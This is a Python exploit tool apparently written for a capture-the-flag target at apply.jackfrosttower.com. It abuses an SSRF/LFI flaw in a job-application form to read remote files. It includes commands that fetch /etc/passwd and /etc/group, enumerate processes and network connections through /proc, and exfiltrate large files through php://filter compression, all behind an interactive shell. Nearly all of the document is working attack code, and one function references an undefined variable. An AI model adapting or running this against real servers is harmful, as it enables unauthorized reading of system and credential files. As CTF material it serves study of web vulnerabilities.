#!/usr/bin/env python3

# Abuse the SSRF/LFI vulnerability in https://apply.jackfrosttower.com
# for fun and profit.
#
# Joe Ammond (pugpug)
# 

import argparse
import base64
import cmd
import os
import requests
import random
import sys
import zlib

# Generate a random name to avoid conflicts with others
name = 'pugpug{:03d}'.format(random.randint(1, 999))

payload = {
    'inputName': name,
    'inputEmail': 'pug@pug.pug',
    'inputPhone': '313-555-1212',
    'inputField': 'Aggravated pulling of hair',
    'resumeFile': '',
    'additionalInformation': '',
    'submit': ''
}

# TCP state table, from /usr/include/netinet/tcp.h
tcp_states = {
    '01': 'TCP_ESTABLISHED',
    '02': 'TCP_SYN_SENT',
    '03': 'TCP_SYN_RECV',
    '04': 'TCP_FIN_WAIT1',
    '05': 'TCP_FIN_WAIT2',
    '06': 'TCP_TIME_WAIT',
    '07': 'TCP_CLOSE',
    '08': 'TCP_CLOSE_WAIT',
    '09': 'TCP_LAST_ACK',
    '0A': 'TCP_LISTEN',
    '0B': 'TCP_CLOSING',
    '0C': 'TCP_NEW_SYN_RECV'
}

# Convert a hex representation of an IPv4 address to dotted-quad
def hex_to_dec(hexstring):
    bytes = ["".join(x) for x in zip(*[iter(hexstring)]*2)]
    bytes = [int(x, 16) for x in bytes]
    return ".".join(str(x) for x in reversed(bytes))

# Fetch a file/URL from the SSRF/LFI vulnerability
def fetch(args):
    payload['inputWorkSample'] = args
    r = requests.get(parser.url, params = payload)
    r = requests.get(parser.url + f'images/{name}.jpg')
    return r.text

# Fetch /etc/passwd from the remote host and return a dict of
# uid->username
def fetch_users():
    users = {}
    passwd = fetch('/etc/passwd')
    for user in passwd.split('\n')[:-1]:
        user = user.split(':')
        users[user[2]] = user[0]
    return users

# Similar to above, but with /etc/group and gid->groupname
def fetch_groups():
    groups = {}
    group_data = fetch('/etc/group')
    for group in groups_data.split('\n')[:-1]:
        group = group.split(':')
        groups[group[2]] = group[0]
    return groups

class Term(cmd.Cmd):
    prompt = 'ssrf> '

    def emptyline(self):
        pass
    def postloop(self):
        print()

    def do_exit(self, args):
        return True
    def do_EOF(self, args):
        return True

    def do_shell(self, s):
        os.system(s)
    def help_shell(self):
        print("execute shell commands")

    def do_ps(self, args):
        '''Print a list of processes, only reading files from /proc/[pid]'''

        # If we're passed an argument, use that as the number of processes
        # to dump, otherwise default to 200.
        if args == '':
            pid_max = 200
        else:
            pid_max = int(args)

        print('{:<8}{:>5}{:>5} {}'.format('UID', 'PID', 'PPID', 'CMD'))

        # Fetch UID -> username mapping data
        users = fetch_users()

        for pid in range(pid_max):
            cmdline = fetch(f"/proc/{pid}/cmdline")

            # If /proc/[pid]/cmdline has data, pull /proc/[pid]/status for
            # further information. /proc/[pid]/stat has a more parseable
            # form, but doesn't include the UID data.
            if cmdline != '':
                # cmdline is NULL separated, replace with SPACE for printing
                cmdline = cmdline.replace('\x00', ' ')

                for line in fetch(f"/proc/{pid}/status").split('\n')[:-1]:
                    line = line.split()
                    if line[0] == 'PPid:':
                        ppid = line[1]
                    elif line[0] == 'Uid:':
                        uid = line[1]
                print(f'{users[uid]:<8}{pid:>5}{ppid:>5} {cmdline}')
        print()

    def do_netstat(self, args):
        '''Parse /proc/net/tcp and display in netstat format'''
        print('{:<24}{:<24}{}'.format('Local Address','Remote Address','State'))
        netstat_data = fetch('/proc/net/tcp').split('\n')[1:-1]
        for line in netstat_data:
            line = line.split()

            local_ip = hex_to_dec(line[1].split(':')[0])
            local_port = int(line[1].split(':')[1], 16)
            local = f'{local_ip}:{local_port}'

            remote_ip = hex_to_dec(line[2].split(':')[0])
            remote_port = int(line[2].split(':')[1], 16)
            remote = f'{remote_ip}:{remote_port}'

            print(f'{local:<24}{remote:<24}{tcp_states[line[3]]}')

    def do_largefile(self, args):
        '''Fetch a large file, using PHP filters to compress and base64 encode'''
        if args != '':
            filename = os.path.basename(args)
            path = f'php://filter/zlib.deflate/convert.base64-encode/resource={args}'
            data = fetch(path)

            if data != '':

                # zlib.decompress with a negative window size will ignore header
                # and footer values. Magic.
                data = zlib.decompress(base64.b64decode(data), -15)
                with open(filename, 'wb') as file:
                    file.write(data)
                print('Wrote {} bytes to {}'.format(len(data), filename))
            else:
                print('No data returned.')

            print()

    def default(self, args):
        print(fetch(args))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--file', dest='filename', 
            required=False, type=str, help='Filename to fetch')
    parser.add_argument('--url', dest='url', 
            default='https://apply.jackfrosttower.com/',
            required=False, help='Top-level URL')
    parser = parser.parse_args()

    if parser.filename:
        print(fetch(parser.filename))
    else:
        term = Term()
        term.cmdloop()
